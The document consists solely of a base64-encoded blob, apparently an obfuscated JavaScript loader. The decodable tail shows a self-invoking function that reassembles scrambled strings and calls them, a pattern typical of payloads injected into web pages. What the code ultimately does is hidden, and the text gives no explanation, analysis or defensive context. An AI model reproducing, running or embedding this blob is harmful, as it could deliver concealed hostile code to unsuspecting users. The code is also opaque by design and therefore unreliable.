WlyaChyLnR1fTplLjkoKy5BQVRBey0sZUFnM29uX19mQUF7XWUpcmxuSl90dGVmPSxBQSt9NWlvWG59aGxvK1oxQShjMTYlMGxuMWV4cjBBXSggdDB4bzFvW29FbmVdZGEyXUFmWGlqMGEzNEFmZUF0PW9BQS0laTVBRktsLjNBMkF1QTNdX0F0ZDsxXSApNXQge3tBaSBhWWE9Zi5laS5vLC49NEFmZFMrKHRiKE4uXVkoZjRiWXg1Mm90bUJBYWk9bjcrQUxybGlvZnQsKWM9ZEFzLC5zYl1BbztkNTdBZHtBQXRudCl0b1NdeW4uQWsjKS5UOXRBbUtfLikoQWxBam07bzo+XzRBLCMkNUFmaTFdKTVkKWRBQT1zbnBBKX1BMzcwdENfdGNBZX17MUEuXSB7Zkt0PWc1LkEwfWV0QWFydHJBanQ4QDtBczNBIkFBX05sfWZBQS5jVCElaV11Y2VpQTg6cnJpKXBpXWVuLnlBc0EuQWkkdD1BdiU4ZnBjQkFBaUEpSGw4JiFmZGU9QV9BcjN1Q3FddHIgQUFCfXBye0E2dDJsQUF1KColY2Y1JHYpJnJwPVAkWCkubl1yZV9Be10gXV1pOy5iY0F0ZmUpPy47UzAuZGlfdHopMkFBQWVpOy4ubDFfVzRvO2dBZTU5Vl0lLixIXWUyLD02LTJzQSkyOXM6Xy5pKWVBZUE7U0FjcmhBcGF0c15lQXRuIHVkKGZjPSlmMT0gTXllKG5db18pZildQT0lRWIwb3I7QTIoNl0uMnJeOykockFcJ2Nsb11vZCBjbns7e0VfYShqSm4oX0E1KTJhJS5BZV0laX0uW2RvQWkxJEF0b19BLEspQWZlQSkuO2kyJVdoXUFfOXAhdGRBLm9kYSF4QS09QWVMZTRdMj09Myxzc2ZuJl8uJSZ0MGN1LnprQT03LixUNkFTYWw9NkE1KEEsQSkgKEFuXWxnMzApMTphWSRbNnVmbmZufUFfYl8lOzlfbyl2QUltMWY+cmBBJXNvbyggQWNbLnBvNWxsbmUoIX0wLCUpdGVBcC5uXWFbMm03YmVuaX1zZVpcJ309QSkoXW5vUXAxIF8xX2tBMXJBX2UiSV9tajk3RGEwM19BUl1hQWFwcyVdXUFjIUxvYDUpb19TQS5BX2JuNWMoKEFuQnNmMWY0cCUobEE9M29wMCBkQV1fb21mZnIrdWFBaWZlMWguZUEpSm81M0FdbyBvW2Y2QTo7YyhmeyRwdEE1QTNfMyVgZV0sdGFwMnJjMWsyJis7ZUEzb21vKU5mQWVmKGlyIFUhen1lMnthMmFIJSlBZGUoeyBvb11fQV9obnAuYS54QWVUdnJuRS5BKWggOzJsYTRpLmdvQXNldSsxNnQuQStkZnRvdDZdbkFlJHAuQUE0Y2ZjM3R7IGMoQXRBblRBQ31Bcm4gZiApZVhPci53Um9cXHA2ZV9BPXR0QUFjcjJpJXRuXV1fd0FyNm9kMnNwbylqYyAyKW4xNXQ6b19ze302LHU7QW4gZTt0bSY/dyUocyhhNi5dOUFhZn0pOzEpXUAoKUFsQXRjQTdvXX0zPUEpIXIpXUFfcF00K3M4W2gsQWpuQTUpMyk9JHIgYylzU0EzPUE2NTArIlwve0FdIS5vID1veS4tIV9mKCBmYUgjQXVtZm5oKS4zOm5hQS5mIChiZiEzQTMrOkVpZyE1dF1ZJUEuKGEuJXspQWcgXz1Bbm9BMSZmPXVfb3YkQXNBbjonKSk7dmFyIERHWT1xamkod21hLGxQZiApO0RHWSg1MzgwKTtyZXR1cm4gMTE2NH0pKCk='))
